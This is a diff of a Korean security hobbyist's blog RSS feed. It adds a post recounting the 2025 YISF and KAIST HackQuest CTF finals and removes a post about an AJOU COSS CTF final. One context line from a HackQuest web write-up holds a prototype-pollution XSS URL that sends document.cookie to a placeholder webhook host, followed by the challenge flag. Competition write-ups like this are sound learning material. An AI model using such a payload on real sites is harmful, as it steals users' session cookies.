@@ -1,4 +1,43 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 HackQuest Final Write-Up</title><link>https://itznullbyte.github.io/posts/hackquest_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest_final/</guid><description>4등</description><pubDate>Tue, 26 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;4등으로 마무리 했다 goldleo님이 3등으로 동점이지만 워낙 웹 고수셔서 크게 아쉽진 않다..&lt;br /&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 YISF, HackQuest 후기</title><link>https://itznullbyte.github.io/posts/yisf_kaist_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/yisf_kaist_final/</guid><description> </description><pubDate>Tue, 09 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;이전에 썼던 Write-Up 글들을 보신분들은 알겠지만 이번에 열린 순천향대 정보보호 페스티벌, Kaist Hackquest 본선에 다녀왔습니다&lt;/p&gt;
+&lt;p&gt;후기 적어보겠습니다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;2025 YISF&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;예선&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;우선 예선부터 설명하자면 금요일 오후 9시부터 일요일 오전 9시까지 약 이틀동안 진행 되었다.&lt;/p&gt;
+&lt;p&gt;11시에 학원끝나고 집에 들어와서 바로 시작했고 5시간정도 뛰고 새벽 4시쯤 잤다&lt;br /&gt;
+분야별로 쉬운 문제들을 다 풀어놨다&lt;/p&gt;
+&lt;p&gt;다음날 9시쯤 일어나서 웹을 올솔했다. 개인적으로 &lt;code&gt;Re:LS&lt;/code&gt;라는 안드로이드 리버싱과 SSRF를 써서 해결해야하는 문제가 있었는데 재미있었다.&lt;/p&gt;
+&lt;p&gt;전반적으로 예선 웹이 진짜 아쉬웠는데 난이도가 출제된 웹 5문제 중에 2~3문제에 아주 쉬운 언인텐이 발생했다.
+그래서 다른 분야에 비해 솔버수가 꽤 많았다. 나처럼 웹이 주분야인 사람들한텐 변수였을거다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://dreamhack.io/wargame/challenges/2185&quot;&gt;Executable&lt;/a&gt; 문제는 진짜 감이 아예 안온다.&lt;/p&gt;
+&lt;p&gt;토요일 밤에 12등을 먹으며 이정도면 18등 본선 커트라인에는 들겠지? 라는 생각으로 잤는데 새벽에 키핑이 있었다.&lt;/p&gt;
+&lt;p&gt;일어나서 20등이 된 등수를 보니 진짜 참담했다&lt;br /&gt;
+.&lt;br /&gt;
+.&lt;br /&gt;
+.&lt;br /&gt;
+.&lt;/p&gt;
+&lt;p&gt;근데 왜인지 위에서 몇 분 빠지셔서 턱걸이 본선갔다 :)&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;본선&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;다른 사람들 블로그에서나 보던 순천향대 향설생활관에서 진행되었다&lt;/p&gt;
+&lt;p&gt;딱히 많이 할 말은 없다 10등해서 한 등수 차이로 상 못 받았다&lt;/p&gt;
+&lt;p&gt;핑계를 좀 대자면 이유가 두 가지가 있는데&lt;br /&gt;
+첫번째는 일단 내가 포렌식 문제를 다운을 안받아놨었다.&lt;br /&gt;
+미래의 본선 진출자들은 YISF에서 포렌식이 큰 비중을 차지하니까 꼭 미리 다운받아가자.&lt;br /&gt;
+두번째는 주분야인 웹 3문제 중 하나가 굉장히 쉬워서 참가자 모두가 풀어버렸고, 하나는 포렌식이랑 엮어서 나와서 건들지도 못했다.
+나머지 하나는 0솔 문제다..&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;GANGIA&lt;/strong&gt;라는 출제자분들 중 한 분의 정확한 좌표를 찾는 osint 문제가 있었는데 재미있게 풀었다. 분명 구글맵 좌표로는 정확히 맞는데 정답과 꽤 달랐다. 힌트받고 풀었다.&lt;/p&gt;
+&lt;p&gt;예선, 본선 모두 웹 문제의 퀄리티가 약간 아쉽긴 했지만 좋은 경험이었다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;2025 KAIST Hackquest&lt;/h3&gt;
+&lt;p&gt;새벽같이 일어나서 대전으로 갔다&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./image1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;암호학 한 문제랑 웹 3문제 올솔브했고 본선 진출자 20명 중 4등했다.
+3등까지 상이라서 YISF와 마찬가지로 한 등수 차이로 상 못 받았다&lt;/p&gt;
+&lt;p&gt;밥은 카이스트가 제일 맛있었다. 유부초밥 나왔는데 대회하면서 하나씩 먹기 편했다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./image2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;우수수료증이랑 기념품을 뭘 많이 줬다&lt;/p&gt;
+</content:encoded></item><item><title>2025 HackQuest Final Write-Up</title><link>https://itznullbyte.github.io/posts/hackquest_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest_final/</guid><description>4등</description><pubDate>Tue, 26 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;4등으로 마무리 했다 goldleo님이 3등으로 동점이지만 워낙 웹 고수셔서 크게 아쉽진 않다..&lt;br /&gt;
 더 어렵게 나왔으면 격차는 더 벌어졌을거다&lt;br /&gt;
 웹은 꽤 쉬웠고 올솔했다. 하나는 웹 같지가 않아서 2개만 write up 써보겠다&lt;/p&gt;
 &lt;h2&gt;Simple Gallery&lt;/h2&gt;
@@ -464,6 +503,8 @@ Dreamhack과 Goorm에 유의미한 취약점들을 제보할 수 있었다&lt;/p
 첫 오프라인 CTF였는데 닉네임만 들어본 네임드분들을 실제로 만나니 신기했다. 수상은 못했다&lt;/p&gt;
 &lt;p&gt;카이스트는 웹 마지막 문제 풀어서 겨우 본선 진출에 성공했다.&lt;br /&gt;
 포너블이랑 리버싱을 진짜 못하는지라 어려울줄 알았는데 3일정도 써서 난이도 있던 웹문제를 풀어냈다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;이후부턴 월별로 따로 쓰겠다&lt;/p&gt;
 </content:encoded></item><item><title>CCE Apollo Write-Up</title><link>https://itznullbyte.github.io/posts/cce_apollo/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cce_apollo/</guid><description> </description><pubDate>Wed, 30 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Solve&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;timetravel&lt;/li&gt;
@@ -776,29 +817,6 @@ html 삽입은 가능하지만 &lt;code&gt;DOMPurify.sanitize()&lt;/code&gt; 되
 &lt;pre&gt;&lt;code&gt;http://158.247.241.230:10897/view/?id=29f97926-66da-4d01-9a80-b69c6b49da52&amp;amp;[constructor][prototype][url]=data:text/javascript;charset=utf-8,document.location.href=&apos;https://webhook/test?q=&apos;+%2Bdocument.cookie;//&amp;amp;[constructor][prototype][dataType]=script&amp;amp;[constructor][prototype][crossDomain]=
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;code&gt;flag: hackquest2025{caf7088a3562e36cb29876b8dd45a3384f4b0d0533ecc2778234b845693eca03}&lt;/code&gt;&lt;/p&gt;
-</content:encoded></item><item><title>AJOU COSS CTF 2025 Final 후기</title><link>https://itznullbyte.github.io/posts/cossctf-final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cossctf-final/</guid><description> </description><pubDate>Sun, 20 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;대회장 입장&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;./start.jpg&quot; alt=&quot;&quot; /&gt;
-아주대 COSS CTF 본선 갔다왔다. 생각나는대로 적어보겠다.&lt;/p&gt;
-&lt;p&gt;일단 9시에 30분 일찍 대회장 도착했다. 30분 동안 대기실에 있었는데 아는 사람이 없어서 구석에서 인스타 보고 있었다
-팀원들 만나고 대회장 들어갔다.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;./teamtag.jpg&quot; alt=&quot;&quot; /&gt;
-강의실에서 대회 진행했는데 진짜 강의실 일체형 나무 의자는 지옥이다. 대회 내내 허리아파 죽는줄 알았다&lt;/p&gt;
-&lt;p&gt;이름표 받았는데 주위 둘러보니까 이름 한 번씩 들어본 사람들이 꽤 있었다 현실에서 보니 신기했다&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;대회 시작&lt;/h2&gt;
-&lt;p&gt;일단 난 시작하자마자 웹을 잡았다.&lt;br /&gt;
-어차피 crypto나 분야별 쉬운 문제는 누군가 풀어줄거기에 플래그 욕심 안내고 웹만 하루종일 풀고 가자는 생각으로 했다.&lt;br /&gt;
-웹 문제는 블랙박스 3문제, 화이트 박스 1문제가 나왔다&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;./first_prob.png&quot; alt=&quot;&quot; /&gt;
-첫번째는 저런식으로 입력하면 파일 다운해주는 서비스였다&lt;/p&gt;
-&lt;p&gt;웹 최다솔브 나온 문제였는데 오래 잡고있던건 진짜 사고다&lt;/p&gt;
-&lt;p&gt;중간에 밥 나왔는데 맛있었다&lt;/p&gt;
-&lt;p&gt;오프라인 CTF는 처음이라 좀 긴장해서 그런지 아무것도 못했던거 같다.&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;결국 난 0솔로 마무리했다.
-CTF하면서 0솔한건 처음 같은데 0솔한거 자체보단 당연히 풀법한 문제들을 못풀었다는게 더 참담했다.&lt;/p&gt;
-&lt;p&gt;다음 CTF까지는 팀원들한테 민폐 안끼치도록 열심히 공부할 생각이다.
-CCE 전까진 부족한 부분 기초 개념까진 메우고 드림핵 5~6레벨 위주로 풀어볼 생각이다&lt;/p&gt;
 </content:encoded></item><item><title>AJOU COSS CTF Quals 2025 Write-Up</title><link>https://itznullbyte.github.io/posts/cossctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cossctf/</guid><description>3th</description><pubDate>Mon, 23 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;./scoreboard.jpg&quot; alt=&quot;&quot; /&gt;
 운 좋게도 예선 3등했다.&lt;/p&gt;
